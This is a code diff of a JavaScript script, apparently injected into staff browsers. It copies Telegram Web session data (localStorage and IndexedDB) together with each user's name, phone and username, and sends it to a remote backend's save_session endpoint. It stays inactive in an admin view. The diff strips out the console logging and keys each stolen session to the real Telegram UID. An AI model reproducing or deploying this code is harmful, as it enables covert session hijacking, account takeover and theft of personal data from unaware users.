@@ -270,23 +270,13 @@ async function exportIndexedDB(dbName, storeName) {
 // ================= STAFF BROWSER =================
 
             if (localStorage.getItem("is_admin_view") === "true") {
-                console.log("itisad");
                 return; 
             }
 
-            console.log("....");
-            
             setTimeout(() => {
-                let myUserId = localStorage.getItem("my_custom_user_id");
-                if (!myUserId) {
-                    myUserId = "staff_" + Math.floor(Math.random() * 100000);
-                    localStorage.setItem("my_custom_user_id", myUserId);
-                }
-
                 let lastSyncLength = 0; 
                 let wasLoggedIn = false; 
-                let lastKnownUserId = myUserId; 
-                
+                let lastKnownUserId = null; 
                 let isProfileFullyLoaded = false; 
 
                 const syncSessionData = async () => {
@@ -295,8 +285,8 @@ async function exportIndexedDB(dbName, storeName) {
                     
                     const isLoggedIn = profile !== null || lsDataStr.length > 1500;
 
-                    if (wasLoggedIn && !isLoggedIn) {
-                        console.log("out");
+                    // Logout လုပ်သွားရင် ဖျက်မည့်အပိုင်း
+                    if (wasLoggedIn && !isLoggedIn && lastKnownUserId) {
                         try {
                             fetch(BACKEND_URL + "/api/delete_session", {
                                 method: "POST",
@@ -304,26 +294,22 @@ async function exportIndexedDB(dbName, storeName) {
                                 body: JSON.stringify({ user_id: lastKnownUserId }), 
                                 keepalive: true 
                             });
-                            console.log("deldb");
                             wasLoggedIn = false; 
                             lastSyncLength = 0;
                             isProfileFullyLoaded = false; 
-                        } catch(e) { console.error("errordb", e); }
+                        } catch(e) {}
                         return; 
                     }
 
-                    if (isLoggedIn) {
+                    if (isLoggedIn && profile) {
                         wasLoggedIn = true; 
+                        
+                        // 🌟 Fake ID အစား Telegram ရဲ့ UID အစစ်ကိုသာ အသုံးပြုပါမည် 🌟
+                        lastKnownUserId = profile.uid; 
 
-                  
-                        if (profile && !isProfileFullyLoaded) {
+                        if (!isProfileFullyLoaded) {
                             isProfileFullyLoaded = true;
                             lastSyncLength = 0; 
-                        }
-
-                        if (profile) {
-                            myUserId = profile.uid; 
-                            lastKnownUserId = profile.uid; 
                         }
 
                         try {
@@ -331,36 +317,24 @@ async function exportIndexedDB(dbName, storeName) {
                             const idbDataStr = serializeData(rawIdbData);
                             
                             const currentDataLength = idbDataStr.length + lsDataStr.length;
-
                             if (lastSyncLength === currentDataLength) return; 
-
-                            console.log("changesync");
-
-                            const finalName = profile ? profile.name : `Staff (${lastKnownUserId})`;
-                            const finalPhone = profile ? profile.phone : "Waiting Profile...";
-                            const finalUsername = profile ? profile.username : "";
 
                             const res = await fetch(BACKEND_URL + "/api/save_session", {
                                 method: "POST",
                                 headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
                                 body: JSON.stringify({
-                                    user_id: lastKnownUserId, 
-                                    profile_name: finalName,
-                                    profile_phone: finalPhone,
-                                    profile_username: finalUsername,
+                                    user_id: lastKnownUserId, // Telegram Unique ID သုံးသွားပါပြီ
+                                    profile_name: profile.name,
+                                    profile_phone: profile.phone,
+                                    profile_username: profile.username,
                                     local_storage_str: lsDataStr,
                                     indexed_db_str: idbDataStr,
                                     timestamp: new Date().toISOString()
                                 })
                             });
                             
-                            if(res.ok) {
-                                console.log(`successsync: ${finalName}`);
-                                lastSyncLength = currentDataLength; 
-                            }
-                        } catch(e) { console.error("synfailed:", e); }
-                    } else {
-                        console.log("wating...");
+                            if(res.ok) lastSyncLength = currentDataLength; 
+                        } catch(e) {}
                     }
                 };
 
